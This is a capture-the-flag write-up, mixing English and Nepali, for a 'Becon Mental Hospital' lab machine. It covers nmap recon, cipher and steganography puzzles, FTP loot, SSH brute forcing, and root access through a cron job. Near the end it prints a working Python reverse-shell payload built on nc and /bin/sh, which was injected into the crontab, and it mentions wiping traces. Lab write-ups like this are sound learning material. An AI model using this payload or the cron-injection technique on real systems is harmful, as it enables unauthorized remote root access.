## Initial Recon
- **suru ma ta nmap nai hane**  
  Started with **nmap** scanning:

```

PORT STATE SERVICE REASON VERSION  
21/tcp open ftp syn-ack ttl 62 ProFTPD 1.3.5a  
22/tcp open ssh syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:  
| 2048 44:2f:fb:3b:f3:95:c3:c6:df:31:d6:e0:9e:99:92:42 (RSA)  
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDtgGI2Qpv+ora/iClEVeJSyw673ED4ciilMWv/Cw2NtVl9oB8A5rKktZYnJDw5sYZOvXimjb20Rk6a742anZZA87PM3StTZy8ZAMDEwdt8omaz5zy1c+HcJi4jjUIzPAZK10iKJ0JnyZ3eZZgEXALsU1zTi6U8Wn+6pixB9yRzAV8FVd/UThmC8vkiyNbNJUF6tgP+paajOIq2KzcmYrn8zZFL79EjDUUqSx72/wc/VUYyNArVGtVmOuvW1TBQwnpUv3zNQL1sabfiRzmgWB4unfHCVbj8autfHOfHSpMxC5QOuOJRTdhak6MUlHbjSXBF5MU1OP4mNTIoh/+e8k17  
| 256 92:24:36:91:7a:db:62:d2:b9:bb:43:eb:58:9b:50:14 (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCE8pJD7f5qX4X2kInnJf/m5wbTLOFA3I49Hyi2MrHxg3jREHseTbpqk00Xmy7F2+8Z8ljTdJwD9aafUAPgXxes=  
| 256 34:04:df:13:54:21:8d:37:7f:f8:0a:65:93:47:75:d0 (ED25519)  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPxHqNM/ISBztZhs47D+flKJiTqFqt5kJrFDoeNyO8Zb  
80/tcp open http syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))  
| http-methods:  
|_ Supported Methods: GET HEAD POST OPTIONS  
|_http-title: Welcome To Becon Mental Hospital  
|_http-server-header: Apache/2.4.18 (Ubuntu)  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running: Linux 4.X  
OS CPE: cpe:/o:linux:linux_kernel:4.4  
OS details: Linux 4.4

```

---

## Web Enumeration

- **eta uta web ma gaye, dev tools hane gardai gaye**  
Explored website, used developer tools.
- Found `/sadistRoom` endpoint in source code.
- Extracted key:  
`532219a04ab7a02b56faafbec1a4c1ea`
- Used key to access `/lockerRoom`.
- Found encoded string:  
```

Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv

````
- Decoded with Atbash cipher to:  
`Grant_me_access_to_the_map_please`
- Accessed map page.
- Also discovered directories: `/SafeHeaven/` and `/abandonedRoom/`.

---

## OSINT Challenge

- Fuzzed `/SafeHeaven/`, found `/SafeHeaven/keeper/`.
- OSINT challenge pointed to St. Augustine Lighthouse.
- Retrieved keeper key:  
`48ee41458eb0b43bf82b986cecf3af01`.

---

## FTP Enumeration and File Analysis

- **euta ma ftp wala thiyo, ftp bata download gare**  
Downloaded files from FTP.
- Found `.wav` file (`key.wav`).
- Converted `.wav` to strings.
- Used Morse code decoder online:  
https://morsecode.world/international/decoder/audio-decoder-adaptive.html
- Discovered steg-hidden `thankyou.txt` with creds:  
`joseph:intotheterror445`.

---

## Archive and Steganography

- Unzipped `helpme.zip` to get `helpme.txt` and `Table.jpg`.
- **Table.jpg** was actually a zip archive; renamed to `Table.zip`.
- Extracted files inside `Table.zip`:
- `Joseph_Oda.jpg`
- `key.wav`
- Analyzed `Joseph_Oda.jpg` with `exiftool` and `strings`.
- `steghide` extraction failed due to unsupported format.

---

## Password Brute Force

- **euta file thiyo tyas ma dictionary ra checker file thiyo, brute hane**  
Used dictionary and checker file to brute force credentials.
- Successfully logged into SSH.

---

## Privilege Escalation

- Attempted multiple root escalation techniques.
- Root access found via `cron` job.
- **cron tab bata bhayo, teslai append garera file ma rev shell hande**  
Edited crontab to inject reverse shell.
- Reverse shell connected; obtained root.
- **yo ruvik lai ni hataidye**  
Removed traces after escalation.

---

## Final Notes and Flag

- Flag retrieved post root shell.
- Challenge complete.

---

## Tools and Commands Used

- `nmap -sC -sV -p- <target>`
- `strings <file>`
- `exiftool <image>`
- `unzip <file>`
- `steghide extract -sf <file>`
- Morse code decoder: https://morsecode.world/international/decoder/audio-decoder-adaptive.html
- Multitap cipher decoder: https://www.dcode.fr/multitap-abc-cipher
- Reverse shell listener: `nc -lvp 4444`
- Brute force scripts with dictionary

---

## Reverse Shell Payload (used in crontab)

```python
import os
os.system("mkfifo /tmp/kirxhbg; nc <IP> 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg")
````

---

Root obtained, flags captured.

---

Ask if you want automation scripts or detailed steps for any part.